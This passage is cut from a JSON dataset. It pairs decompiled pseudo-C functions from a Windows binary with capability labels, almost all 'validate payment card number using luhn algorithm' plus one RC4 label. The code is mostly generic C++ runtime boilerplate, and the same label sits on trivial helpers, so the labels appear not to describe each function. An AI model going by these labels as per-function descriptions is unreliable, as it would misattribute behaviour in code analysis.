            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410000(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004102c0();\n    puVar1 = fcn.00401440(&arg_ch);\n    fcn.00410a00(arg_8h, *puVar1);\n    return in_ECX;\n}\n",
        "token_count": 91
    },
    "00410130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410130(uint noname_0, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470bc0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00401440(arg_ch);\n    fcn.00408580(&stack0xffffffeb, uVar2, uVar1);\n    uVar2 = fcn.00401440(arg_ch + 4);\n    fcn.00408580(&stack0xffffffeb, uVar2);\n    fcn.00410390(&stack0xffffffeb, arg_ch, 1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffffe8);\n    return;\n}\n",
        "token_count": 258
    },
    "004101f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101f0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_8h + 4);\n    uVar2 = fcn.00401440(arg_ch);\n    uVar2 = fcn.00410b40(arg_8h, puVar1, uVar2);\n    fcn.004103b0(1);\n    *(arg_8h + 4) = uVar2;\n    *puVar1 = uVar2;\n    return;\n}\n",
        "token_count": 157
    },
    "00410280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410280(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00410490(arg_8h);\n    fcn.0040cee0(arg_8h + 8);\n    fcn.0040d9d0(arg_8h + 0x20);\n    return in_ECX;\n}\n",
        "token_count": 88
    },
    "00410390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410390(uint noname_0, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00408d50(arg_ch, arg_10h * 0x68);\n    return;\n}\n",
        "token_count": 54
    },
    "004103b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004103b0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004105d0();\n    piVar2 = fcn.00404940();\n    if ((iVar1 - *piVar2) - 1U < arg_8h) {\n        fcn.00425746(\"list<T> too long\");\n    }\n    piVar2 = fcn.00404940();\n    *piVar2 = *piVar2 + arg_8h;\n    return;\n}\n",
        "token_count": 145
    },
    "004104f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004104f0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00404960(uVar1);\n    arg_14h = fcn.00407260(arg_8h);\n    arg_ch = *(iVar2 + 0x10);\n    arg_8h_00 = fcn.00406170();\n    fcn.00410c50(arg_8h_00, arg_ch, arg_8h, arg_14h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 254
    },
    "004105b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004105b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040c800(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "004105d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004105d0(uint param_1)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00404960(param_1);\n    fcn.00410640(uVar1);\n    return;\n}\n",
        "token_count": 77
    },
    "004106e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004106e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_ch - arg_8h >> 1 == arg_14h - arg_10h >> 1) {\n        iVar1 = fcn.00410ec0(arg_8h, arg_ch, arg_10h, arg_18h & 0xff);\n    }\n    else {\n        iVar1 = (arg_ch - arg_8h >> 9) << 8;\n    }\n    return iVar1;\n}\n",
        "token_count": 154
    },
    "00410720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410720(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470428;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = arg_10h;\n    fcn.00408270(arg_10h);\n    var_4h = 0;\n    fcn.00406400(uVar2, uVar1);\n    uVar2 = fcn.004106d0(&arg_ch);\n    arg_8h_00 = fcn.004106d0(&arg_8h);\n    fcn.00410e30(arg_8h_00, uVar2);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 269
    },
    "004107b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004107b0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint noname_0;\n    uint arg_10h;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470bf0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    iVar1 = fcn.0040f7b0(var_8h, var_ch_2);\n    noname_0 = fcn.00404960();\n    var_4h = 0;\n    arg_10h = fcn.00401440(var_10h_2);\n    arg_ch = fcn.00401440(iVar1 + 8);\n    fcn.00410f00(noname_0, arg_ch, arg_10h);\n    *in_FS_OFFSET = var_ch_3;\n    return iVar1;\n}\n",
        "token_count": 305
    },
    "00410880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00410880(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    fcn.00410f30(var_1h, uVar1);\n    uVar1 = fcn.0040f730();\n    puVar2 = fcn.004072d0();\n    *puVar2 = uVar1;\n    return in_ECX;\n}\n",
        "token_count": 153
    },
    "00410af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00410af0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_10h_00;\n    uint arg_14h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_10h_00 = fcn.00401440(arg_10h);\n    arg_14h_00 = fcn.00401440(arg_14h);\n    fcn.00410f90(arg_8h, arg_ch, arg_10h_00, arg_14h_00);\n    return;\n}\n",
        "token_count": 167
    },
    "00410b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00410b40(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint noname_0;\n    uint arg_10h;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470c70;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    iVar1 = fcn.0040f7b0(var_8h, var_ch_2);\n    noname_0 = fcn.00404960();\n    var_4h = 0;\n    arg_10h = fcn.00401440(var_10h_2);\n    arg_ch = fcn.00401440(iVar1 + 8);\n    fcn.00410fe0(noname_0, arg_ch, arg_10h);\n    *in_FS_OFFSET = var_ch_3;\n    return iVar1;\n}\n",
        "token_count": 305
    },
    "00410c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410c50(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    if (arg_ch == arg_14h) {\n        arg_ch = fcn.004105b0(arg_8h, arg_10h, arg_ch);\n        if (arg_ch == 0) {\n            var_4h = 1;\n            goto code_r0x00410c84;\n        }\n    }\n    var_4h = 0;\ncode_r0x00410c84:\n    return arg_ch & 0xffffff00 | var_4h;\n}\n",
        "token_count": 154
    },
    "00410d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00410d70(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_10h;\n    uint var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470c98;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0040c8b0(uVar1);\n    var_4h = 0;\n    *in_ECX = vtable.std::_Ref_count_resource_void____void____cdecl___void____.0;\n    arg_10h = &arg_8h;\n    arg_ch_00 = fcn.00401440(&arg_ch);\n    fcn.00411010(var_dh, arg_ch_00, arg_10h);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 269
    },
    "00410e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410e30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint arg_ch_00;\n    uint var_4h;\n    \n    if (arg_8h != arg_ch) {\n        arg_ch_00 = fcn.00401440(arg_ch - arg_8h >> 1);\n        fcn.004064f0(arg_8h, arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00410ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00410ec0(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint var_1h;\n    \n    fcn.00409f20(&arg_8h, &arg_10h, &arg_14h);\n    fcn.00411470(arg_8h, arg_ch, arg_10h, arg_14h & 0xff);\n    return;\n}\n",
        "token_count": 119
    },
    "00410f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410f00(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x60, arg_ch);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.00411050(arg_8h);\n    return;\n}\n",
        "token_count": 91
    },
    "00410f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410f30(uint noname_0, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401440(arg_ch);\n    fcn.004102c0();\n    return in_ECX;\n}\n",
        "token_count": 62
    },
    "00410fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410fe0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x60, arg_ch);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.00411080(arg_8h);\n    return;\n}\n",
        "token_count": 91
    },
    "00411010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00411010(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    puVar1 = fcn.00401440(arg_ch);\n    *in_ECX = *puVar1;\n    puVar1 = fcn.00401440(arg_10h);\n    in_ECX[1] = *puVar1;\n    return in_ECX;\n}\n",
        "token_count": 111
    },
    "00411050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411050(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00410280(arg_8h);\n    fcn.0040cee0(arg_8h + 0x48);\n    return in_ECX;\n}\n",
        "token_count": 70
    },
    "00411400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00411400(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint var_4h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_14h);\n    fcn.00407240(arg_8h + arg_14h * 2, arg_1ch, arg_20h);\n    fcn.00407240(arg_8h + arg_14h * 2 + arg_20h * 2, arg_ch + arg_14h * 2 + arg_18h * 2, \n                 ((arg_10h - arg_18h) - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 197
    },
    "00411470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411470(uint16_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        if (arg_8h == arg_ch) {\n            return 1;\n        }\n        cVar1 = fcn.0040ce50(*arg_8h, *arg_10h);\n        if (cVar1 == '\\0') break;\n        arg_8h = arg_8h + 1;\n        arg_10h = arg_10h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "00411530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411530(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.00411400(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h, arg_18h, arg_1ch);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00411400(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h, arg_18h, arg_1ch);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 661
    },
    "004116e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004116e0(uint param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042642c(param_1);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 117
    },
    "004117d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004117d0(uint param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042644d(param_1);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 117
    },
    "00411840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411840(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470cf0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 8;\n    var_10h = uVar1;\n    fcn.00401b10(8);\n    fcn.00411690(arg_8h_00, uVar1);\n    fcn.004263fa(&var_18h);\n    fcn.00411730(&var_18h);\n    fcn.004116e0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 252
    },
    "004118c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004118c0(uint arg_8h)\n\n{\n    fcn.00411840(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 38
    },
    "00411a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00411a50(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00416750(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00411ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411ab0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    LOCK();\n    *(param_1 + 8) = *(param_1 + 8) + 1;\n    return;\n}\n",
        "token_count": 56
    },
    "00411ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.00411ee0(code *param_1, code *param_2, uint param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    code *var_8h;\n    code *var_ch_2;\n    uint var_10h_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uchar auStack84 [12];\n    uint uStack72;\n    uint var_34h;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    code **var_10h_3;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470de8;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00411ee0::var_ch_3;\n    puStack32 = &stack0xffffffac;\n    fcn.00405810(var_10h_2);\n    var_18h = fcn.00411e20(&fcn.00411ee0::var_34h, var_8h, var_ch_2, var_10h_2);\n    var_4h = 0;\n    uStack72 = 0x411f49;\n    var_14h = var_18h;\n    fcn.00411930(var_18h);\n    var_4h = 0xffffffff;\n    uStack72 = 0x411f58;\n    fcn.004055f0();\n    *var_10h_3 = vtable.std::_System_error.0;\n    var_10h_3[3] = var_8h;\n    var_10h_3[4] = var_ch_2;\n    *in_FS_OFFSET = var_ch_3;\n    return var_10h_3;\n}\n",
        "token_count": 422
    },
    "00412140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412140(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00427093(arg_8h);\n    fcn.00412100(arg_8h_00);\n    return;\n}\n",
        "token_count": 64
    },
    "00412160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412160(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00426bb4(arg_8h, arg_ch);\n    fcn.00412100(arg_8h_00);\n    return;\n}\n",
        "token_count": 72
    },
    "004121f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004121f0(uint param_1)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00402930(param_1);\n    fcn.00412120(arg_8h);\n    return;\n}\n",
        "token_count": 80
    },
    "00412210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00412210(uint param_1)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00402930(param_1);\n    fcn.00412140(arg_8h);\n    return;\n}\n",
        "token_count": 79
    },
    "00412310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412310(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.00416690();\n    arg_ch_00 = fcn.00402930();\n    arg_8h_00 = fcn.00402930();\n    fcn.004267c9(arg_8h_00, arg_ch_00, arg_ch);\n    return;\n}\n",
        "token_count": 108
    },
    "00412350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412350(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402930();\n    fcn.00426850(arg_8h_00);\n    return;\n}\n",
        "token_count": 67
    },
    "00412470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412470(uint arg_8h)\n\n{\n    fcn.00412450(arg_8h);\n    return;\n}\n",
        "token_count": 33
    },
    "00412500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412500(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (arg_10h < 6) {\n    // switch table (6 cases) at 0x412568\n        switch(*(arg_10h * 4 + 0x412568)) {\n        case 0x41251a:\n            uVar1 = fcn.004123e0(arg_8h, arg_ch);\n            break;\n        default:\n            uVar1 = fcn.004123e0(arg_8h, arg_ch);\n            break;\n        case 0x41253e:\n            uVar1 = fcn.004123e0(arg_8h, arg_ch);\n            break;\n        case 0x412550:\n            uVar1 = fcn.004123e0(arg_8h, arg_ch);\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "004126c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004126c0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4706e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004123f0(arg_8h, arg_ch, arg_10h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 132
    },
    "004127a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
